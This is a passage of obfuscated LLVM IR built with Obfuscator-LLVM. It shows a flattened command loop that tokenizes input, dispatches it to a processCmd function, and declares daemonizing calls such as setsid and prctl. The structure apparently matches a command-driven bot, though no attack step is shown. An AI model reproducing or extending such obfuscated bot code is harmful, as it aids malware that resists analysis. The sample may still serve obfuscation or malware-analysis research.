  %424 = call i32 @sleep(i32 1)
  store i32 -1622936314, i32* %switchVar
  br label %loopEnd

; <label>:425:                                    ; preds = %loopEntry
  %426 = load i32, i32* %29, align 4
  %427 = call i32 @fdpclose(i32 %426)
  call void @exit(i32 0) #14
  unreachable

; <label>:428:                                    ; preds = %loopEntry
  store i32 1, i32* %31, align 4
  %429 = load i8*, i8** %24, align 8
  %430 = call i8* @strtok(i8* %429, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0)) #2
  store i8* %430, i8** %32, align 8
  %431 = load i8*, i8** %26, align 8
  %432 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %431, i8** %432, align 16
  store i32 -1572961892, i32* %switchVar
  br label %loopEnd

; <label>:433:                                    ; preds = %loopEntry
  %434 = load i8*, i8** %32, align 8
  %435 = icmp ne i8* %434, null
  %436 = select i1 %435, i32 1893701817, i32 -276632251
  store i32 %436, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load i8*, i8** %32, align 8
  %439 = load i8, i8* %438, align 1
  %440 = zext i8 %439 to i32
  %441 = icmp ne i32 %440, 10
  %442 = select i1 %441, i32 914511192, i32 232105117
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i8*, i8** %32, align 8
  %445 = call i64 @strlen(i8* %444) #10
  %446 = add i64 %445, 1
  %447 = call noalias i8* @malloc(i64 %446) #2
  %448 = load i32, i32* %31, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %449
  store i8* %447, i8** %450, align 8
  %451 = load i32, i32* %31, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %452
  %454 = load i8*, i8** %453, align 8
  %455 = load i8*, i8** %32, align 8
  %456 = call i64 @strlen(i8* %455) #10
  %457 = add i64 %456, 1
  call void @llvm.memset.p0i8.i64(i8* %454, i8 0, i64 %457, i32 1, i1 false)
  %458 = load i32, i32* %31, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %459
  %461 = load i8*, i8** %460, align 8
  %462 = load i8*, i8** %32, align 8
  %463 = call i8* @strcpy(i8* %461, i8* %462) #2
  %464 = load i32, i32* %31, align 4
  %465 = add nsw i32 %464, 1
  store i32 %465, i32* %31, align 4
  store i32 232105117, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0)) #2
  store i8* %467, i8** %32, align 8
  store i32 -1572961892, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  %469 = load i32, i32* %31, align 4
  %470 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %469, i8** %470)
  %471 = load i32, i32* %31, align 4
  %472 = icmp sgt i32 %471, 1
  %473 = select i1 %472, i32 828994234, i32 -1612269445
  store i32 %473, i32* %switchVar
  br label %loopEnd

; <label>:474:                                    ; preds = %loopEntry
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  store i32 425410738, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  %476 = load i32, i32* %33, align 4
  %477 = load i32, i32* %31, align 4
  %478 = icmp slt i32 %476, %477
  %479 = select i1 %478, i32 -2113709931, i32 1879057502
  store i32 %479, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load i32, i32* %33, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %482
  %484 = load i8*, i8** %483, align 8
  call void @free(i8* %484) #2
  store i32 1946260616, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i32, i32* %33, align 4
  %487 = add nsw i32 %486, 1
  store i32 %487, i32* %33, align 4
  store i32 425410738, i32* %switchVar
  br label %loopEnd

; <label>:488:                                    ; preds = %loopEntry
  store i32 -1612269445, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  store i32 705157350, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  store i32 1569827739, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  store i32 -1933400426, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %491, %490, %489, %488, %485, %480, %475, %474, %468, %466, %443, %437, %433, %428, %418, %412, %405, %404, %400, %395, %386, %381, %376, %373, %371, %366, %360, %358, %352, %350, %341, %331, %322, %321, %315, %312, %310, %305, %299, %296, %289, %286, %276, %273, %272, %268, %265, %255, %249, %236, %233, %222, %216, %213, %204, %198, %197, %191, %186, %184, %180, %176, %170, %169, %166, %165, %162, %161, %155, %147, %143, %142, %139, %130, %124, %114, %111, %100, %99, %87, %83, %80, %74, %73, %69, %68, %62, %58, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612692}
!2 = !{i32 -2146611984}
!3 = !{i32 -2146611287}
!4 = !{i32 -2146610396}
!5 = !{i32 -2146609669}
!6 = !{i32 -2146608844}
